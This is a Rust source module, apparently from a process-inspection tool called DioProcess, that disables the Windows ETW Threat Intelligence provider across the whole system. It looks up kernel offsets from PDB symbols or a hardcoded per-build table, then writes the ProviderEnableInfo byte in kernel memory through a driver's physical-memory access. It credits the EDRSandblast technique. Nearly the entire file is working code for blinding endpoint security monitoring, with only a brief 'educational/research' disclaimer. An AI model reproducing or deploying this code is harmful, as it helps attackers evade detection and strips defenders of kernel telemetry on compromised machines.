//! Kernel-level ETW Threat Intelligence (ETWTI) patching
//!
//! Disables ETW Threat Intelligence provider at the kernel level by setting
//! the ProviderEnableInfo flag to 0 in the ETW_GUID_ENTRY structure.
//!
//! This is a system-wide patch that affects all processes, unlike the user-mode
//! EtwEventWrite patch which only affects a single process.
//!
//! Based on EDRSandblast technique: https://github.com/wavestone-cdt/EDRSandblast
//!
//! Now supports dynamic offset resolution via PDB parsing from Microsoft Symbol Server.

use crate::driver::enumerate_kernel_drivers;
use crate::error::CallbackError;
use crate::pdb_resolver::resolve_etwti_offsets;
use crate::physical_memory::{read_physical_memory, translate_virtual_address, write_physical_memory};

#[repr(C)]
struct RTL_OSVERSIONINFOW {
    dw_os_version_info_size: u32,
    dw_major_version: u32,
    dw_minor_version: u32,
    dw_build_number: u32,
    dw_platform_id: u32,
    sz_csd_version: [u16; 128],
}

#[link(name = "ntdll")]
extern "system" {
    fn RtlGetVersion(lpVersionInformation: *mut RTL_OSVERSIONINFOW) -> i32;
}

/// ETWTI offsets for a specific Windows build
#[derive(Debug, Clone, Copy)]
struct EtwtiOffsets {
    /// Windows build number
    build: u32,
    /// Offset of EtwThreatIntProvRegHandle symbol in ntoskrnl.exe
    etw_threat_int_prov_reg_handle: u64,
    /// Offset of GuidEntry field in _ETW_REG_ENTRY structure
    etw_reg_entry_guid_entry: u64,
    /// Offset of ProviderEnableInfo field in _ETW_GUID_ENTRY structure
    etw_guid_entry_provider_enable_info: u64,
}

/// Known ETWTI offsets for various Windows builds
/// These offsets are obtained from PDB symbols for ntoskrnl.exe
/// 
/// To add support for a new Windows build:
/// 1. Download ntoskrnl.pdb for that build from Microsoft Symbol Server
/// 2. Use a PDB parser to get:
///    - EtwThreatIntProvRegHandle symbol offset
///    - _ETW_REG_ENTRY.GuidEntry field offset
///    - _ETW_GUID_ENTRY.ProviderEnableInfo field offset
/// 3. Add a new entry to this table
const ETWTI_OFFSETS: &[EtwtiOffsets] = &[
    // Windows 10 22H2 (19045)
    EtwtiOffsets {
        build: 19045,
        etw_threat_int_prov_reg_handle: 0xC19E70,
        etw_reg_entry_guid_entry: 0x20,
        etw_guid_entry_provider_enable_info: 0x60,
    },
    // Windows 11 22H2 (22621)
    EtwtiOffsets {
        build: 22621,
        etw_threat_int_prov_reg_handle: 0xD1B2A0,
        etw_reg_entry_guid_entry: 0x20,
        etw_guid_entry_provider_enable_info: 0x60,
    },
    // Windows 11 23H2 (22631)
    EtwtiOffsets {
        build: 22631,
        etw_threat_int_prov_reg_handle: 0xD1B2A0,
        etw_reg_entry_guid_entry: 0x20,
        etw_guid_entry_provider_enable_info: 0x60,
    },
    // Windows 11 24H2 (26100)
    EtwtiOffsets {
        build: 26100,
        etw_threat_int_prov_reg_handle: 0xE2C3B0,
        etw_reg_entry_guid_entry: 0x20,
        etw_guid_entry_provider_enable_info: 0x60,
    },
    // Windows Server 2022 (20348)
    EtwtiOffsets {
        build: 20348,
        etw_threat_int_prov_reg_handle: 0xC5A890,
        etw_reg_entry_guid_entry: 0x20,
        etw_guid_entry_provider_enable_info: 0x60,
    },
];

/// Result of ETWTI status check
#[derive(Debug, Clone)]
pub struct EtwtiStatus {
    /// Whether ETWTI is currently enabled
    pub enabled: bool,
    /// Raw ProviderEnableInfo value
    pub provider_enable_info: u8,
    /// Windows build number
    pub build_number: u32,
    /// ntoskrnl.exe base address
    pub ntoskrnl_base: u64,
    /// Whether offsets were resolved from PDB (true) or hardcoded fallback (false)
    pub offsets_from_pdb: bool,
    /// PDB signature used for resolution (empty if using hardcoded offsets)
    pub pdb_signature: String,
}

/// Get the current Windows build number using RtlGetVersion (not subject to compatibility shims)
fn get_windows_build() -> Result<u32, CallbackError> {
    unsafe {
        let mut version_info: RTL_OSVERSIONINFOW = std::mem::zeroed();
        version_info.dw_os_version_info_size = std::mem::size_of::<RTL_OSVERSIONINFOW>() as u32;
        
        // RtlGetVersion is the recommended API - not subject to compatibility shims
        let status = RtlGetVersion(&mut version_info);
        if status >= 0 {
            Ok(version_info.dw_build_number)
        } else {
            Err(CallbackError::IoctlFailed(status as u32))
        }
    }
}

/// Get ETWTI offsets for the current Windows build (hardcoded fallback)
fn get_etwti_offsets_fallback(build: u32) -> Option<&'static EtwtiOffsets> {
    // First try exact match
    if let Some(offsets) = ETWTI_OFFSETS.iter().find(|o| o.build == build) {
        return Some(offsets);
    }
    
    // Try to find closest lower build (same major version)
    let mut best_match: Option<&EtwtiOffsets> = None;
    for offsets in ETWTI_OFFSETS {
        if offsets.build < build {
            match best_match {
                None => best_match = Some(offsets),
                Some(current) if offsets.build > current.build => best_match = Some(offsets),
                _ => {}
            }
        }
    }
    
    best_match
}

/// Resolved offsets with source information
struct ResolvedOffsets {
    etw_threat_int_prov_reg_handle: u64,
    etw_reg_entry_guid_entry: u64,
    etw_guid_entry_provider_enable_info: u64,
    from_pdb: bool,
    pdb_signature: String,
}

/// Get ETWTI offsets - tries dynamic PDB resolution first, falls back to hardcoded
fn get_etwti_offsets(build: u32) -> Result<ResolvedOffsets, CallbackError> {
    // Try dynamic PDB resolution first
    match resolve_etwti_offsets() {
        Ok(pdb_offsets) => {
            return Ok(ResolvedOffsets {
                etw_threat_int_prov_reg_handle: pdb_offsets.etw_threat_int_prov_reg_handle,
                etw_reg_entry_guid_entry: pdb_offsets.etw_reg_entry_guid_entry,
                etw_guid_entry_provider_enable_info: pdb_offsets.etw_guid_entry_provider_enable_info,
                from_pdb: true,
                pdb_signature: pdb_offsets.pdb_signature,
            });
        }
        Err(_) => {
            // Fall back to hardcoded offsets
            if let Some(fallback) = get_etwti_offsets_fallback(build) {
                return Ok(ResolvedOffsets {
                    etw_threat_int_prov_reg_handle: fallback.etw_threat_int_prov_reg_handle,
                    etw_reg_entry_guid_entry: fallback.etw_reg_entry_guid_entry,
                    etw_guid_entry_provider_enable_info: fallback.etw_guid_entry_provider_enable_info,
                    from_pdb: false,
                    pdb_signature: String::new(),
                });
            }
        }
    }
    
    Err(CallbackError::InvalidParameter)
}

/// Get ntoskrnl.exe base address using NtQuerySystemInformation
fn get_ntoskrnl_base() -> Result<u64, CallbackError> {
    use std::mem::size_of;
    
    #[repr(C)]
    struct RtlProcessModuleInformation {
        section: usize,
        mapped_base: usize,
        image_base: usize,
        image_size: u32,
        flags: u32,
        load_order_index: u16,
        init_order_index: u16,
        load_count: u16,
        offset_to_file_name: u16,
        full_path_name: [u8; 256],
    }
    
    #[repr(C)]
    struct RtlProcessModules {
        number_of_modules: u32,
        modules: [RtlProcessModuleInformation; 1],
    }
    
    #[link(name = "ntdll")]
    extern "system" {
        fn NtQuerySystemInformation(
            system_information_class: u32,
            system_information: *mut std::ffi::c_void,
            system_information_length: u32,
            return_length: *mut u32,
        ) -> i32;
    }
    
    const SYSTEM_MODULE_INFORMATION: u32 = 11;
    
    unsafe {
        // First call to get required size
        let mut return_length: u32 = 0;
        NtQuerySystemInformation(
            SYSTEM_MODULE_INFORMATION,
            std::ptr::null_mut(),
            0,
            &mut return_length,
        );
        
        if return_length == 0 {
            // Fallback to driver enumeration
            return get_ntoskrnl_base_from_drivers();
        }
        
        // Allocate buffer
        let mut buffer: Vec<u8> = vec![0; return_length as usize];
        
        let status = NtQuerySystemInformation(
            SYSTEM_MODULE_INFORMATION,
            buffer.as_mut_ptr() as *mut _,
            return_length,
            &mut return_length,
        );
        
        if status < 0 {
            return get_ntoskrnl_base_from_drivers();
        }
        
        let modules = &*(buffer.as_ptr() as *const RtlProcessModules);
        
        if modules.number_of_modules > 0 {
            // First module is always ntoskrnl.exe
            let first_module = &modules.modules[0];
            return Ok(first_module.image_base as u64);
        }
    }
    
    get_ntoskrnl_base_from_drivers()
}

/// Fallback: Get ntoskrnl.exe base address from kernel driver list
fn get_ntoskrnl_base_from_drivers() -> Result<u64, CallbackError> {
    let drivers = enumerate_kernel_drivers()?;
    
    // Search by name
    for driver in &drivers {
        let name_lower = driver.driver_name.to_lowercase();
        if name_lower == "ntoskrnl.exe" || name_lower.starts_with("ntoskrnl") {
            return Ok(driver.base_address);
        }
    }
    
    Err(CallbackError::InvalidData)
}

/// Read a QWORD (8 bytes) from kernel virtual address via physical memory
fn read_kernel_qword(va: u64) -> Result<u64, CallbackError> {
    // Use PID 4 (System process) for kernel address translation
    let walk = translate_virtual_address(4, va)?;
    if walk.physical_address == 0 {
        return Err(CallbackError::IoctlFailed(0));
    }
    
    let data = read_physical_memory(walk.physical_address, 8)?;
    if data.len() < 8 {
        return Err(CallbackError::InvalidData);
    }
    
    Ok(u64::from_le_bytes([
        data[0], data[1], data[2], data[3],
        data[4], data[5], data[6], data[7],
    ]))
}

/// Read a byte from kernel virtual address via physical memory
fn read_kernel_byte(va: u64) -> Result<u8, CallbackError> {
    let walk = translate_virtual_address(4, va)?;
    if walk.physical_address == 0 {
        return Err(CallbackError::IoctlFailed(0));
    }
    
    let data = read_physical_memory(walk.physical_address, 1)?;
    if data.is_empty() {
        return Err(CallbackError::InvalidData);
    }
    
    Ok(data[0])
}

/// Write a byte to kernel virtual address via physical memory
fn write_kernel_byte(va: u64, value: u8) -> Result<(), CallbackError> {
    let walk = translate_virtual_address(4, va)?;
    if walk.physical_address == 0 {
        return Err(CallbackError::IoctlFailed(0));
    }
    
    write_physical_memory(walk.physical_address, &[value])?;
    Ok(())
}

/// Get the current ETWTI provider status
///
/// Returns the current state of the ETW Threat Intelligence provider.
/// Requires the DioProcess kernel driver to be loaded.
/// 
/// This function first attempts to resolve offsets dynamically from PDB,
/// falling back to hardcoded offsets if PDB resolution fails.
pub fn get_etwti_status() -> Result<EtwtiStatus, CallbackError> {
    let build = get_windows_build()?;
    
    let offsets = get_etwti_offsets(build)?;
    
    let ntoskrnl_base = get_ntoskrnl_base()?;
    
    // Calculate address of EtwThreatIntProvRegHandle
    let etw_prov_reg_handle_addr = ntoskrnl_base + offsets.etw_threat_int_prov_reg_handle;
    
    // Read the ETW_REG_ENTRY pointer
    let etw_reg_entry = read_kernel_qword(etw_prov_reg_handle_addr)?;
    if etw_reg_entry == 0 {
        return Err(CallbackError::InvalidData);
    }
    
    // Read the GuidEntry pointer from ETW_REG_ENTRY
    let etw_guid_entry = read_kernel_qword(etw_reg_entry + offsets.etw_reg_entry_guid_entry)?;
    if etw_guid_entry == 0 {
        return Err(CallbackError::InvalidData);
    }
    
    // Read ProviderEnableInfo from ETW_GUID_ENTRY
    let provider_enable_info_addr = etw_guid_entry + offsets.etw_guid_entry_provider_enable_info;
    let provider_enable_info = read_kernel_byte(provider_enable_info_addr)?;
    
    Ok(EtwtiStatus {
        enabled: provider_enable_info != 0,
        provider_enable_info,
        build_number: build,
        ntoskrnl_base,
        offsets_from_pdb: offsets.from_pdb,
        pdb_signature: offsets.pdb_signature,
    })
}

/// Disable the ETW Threat Intelligence provider at kernel level
///
/// This sets the ProviderEnableInfo flag to 0, effectively disabling
/// ETWTI for all processes system-wide.
///
/// **Warning**: This is a system-wide change that affects security monitoring.
/// Use responsibly for educational/research purposes only.
///
/// Requires the DioProcess kernel driver to be loaded.
pub fn disable_etwti() -> Result<EtwtiStatus, CallbackError> {
    let build = get_windows_build()?;
    
    let offsets = get_etwti_offsets(build)?;
    
    let ntoskrnl_base = get_ntoskrnl_base()?;
    
    // Calculate address of EtwThreatIntProvRegHandle
    let etw_prov_reg_handle_addr = ntoskrnl_base + offsets.etw_threat_int_prov_reg_handle;
    
    // Read the ETW_REG_ENTRY pointer
    let etw_reg_entry = read_kernel_qword(etw_prov_reg_handle_addr)?;
    if etw_reg_entry == 0 {
        return Err(CallbackError::InvalidData);
    }
    
    // Read the GuidEntry pointer from ETW_REG_ENTRY
    let etw_guid_entry = read_kernel_qword(etw_reg_entry + offsets.etw_reg_entry_guid_entry)?;
    if etw_guid_entry == 0 {
        return Err(CallbackError::InvalidData);
    }
    
    // Calculate ProviderEnableInfo address and write 0 to disable
    let provider_enable_info_addr = etw_guid_entry + offsets.etw_guid_entry_provider_enable_info;
    write_kernel_byte(provider_enable_info_addr, 0)?;
    
    // Read back to confirm
    let provider_enable_info = read_kernel_byte(provider_enable_info_addr)?;
    
    Ok(EtwtiStatus {
        enabled: provider_enable_info != 0,
        provider_enable_info,
        build_number: build,
        ntoskrnl_base,
        offsets_from_pdb: offsets.from_pdb,
        pdb_signature: offsets.pdb_signature,
    })
}

/// Enable the ETW Threat Intelligence provider at kernel level
///
/// This sets the ProviderEnableInfo flag to 1, re-enabling ETWTI.
///
/// Requires the DioProcess kernel driver to be loaded.
pub fn enable_etwti() -> Result<EtwtiStatus, CallbackError> {
    let build = get_windows_build()?;
    
    let offsets = get_etwti_offsets(build)?;
    
    let ntoskrnl_base = get_ntoskrnl_base()?;
    
    // Calculate address of EtwThreatIntProvRegHandle
    let etw_prov_reg_handle_addr = ntoskrnl_base + offsets.etw_threat_int_prov_reg_handle;
    
    // Read the ETW_REG_ENTRY pointer
    let etw_reg_entry = read_kernel_qword(etw_prov_reg_handle_addr)?;
    if etw_reg_entry == 0 {
        return Err(CallbackError::InvalidData);
    }
    
    // Read the GuidEntry pointer from ETW_REG_ENTRY
    let etw_guid_entry = read_kernel_qword(etw_reg_entry + offsets.etw_reg_entry_guid_entry)?;
    if etw_guid_entry == 0 {
        return Err(CallbackError::InvalidData);
    }
    
    // Calculate ProviderEnableInfo address and write 1 to enable
    let provider_enable_info_addr = etw_guid_entry + offsets.etw_guid_entry_provider_enable_info;
    write_kernel_byte(provider_enable_info_addr, 1)?;
    
    // Read back to confirm
    let provider_enable_info = read_kernel_byte(provider_enable_info_addr)?;
    
    Ok(EtwtiStatus {
        enabled: provider_enable_info != 0,
        provider_enable_info,
        build_number: build,
        ntoskrnl_base,
        offsets_from_pdb: offsets.from_pdb,
        pdb_signature: offsets.pdb_signature,
    })
}

/// Check if the current Windows build is supported for ETWTI patching
/// With dynamic PDB resolution, this should always return true if PDB download succeeds
pub fn is_etwti_supported() -> bool {
    if let Ok(build) = get_windows_build() {
        get_etwti_offsets(build).is_ok()
    } else {
        false
    }
}

/// Get the current Windows build number (public wrapper)
pub fn get_current_build() -> Result<u32, CallbackError> {
    get_windows_build()
}
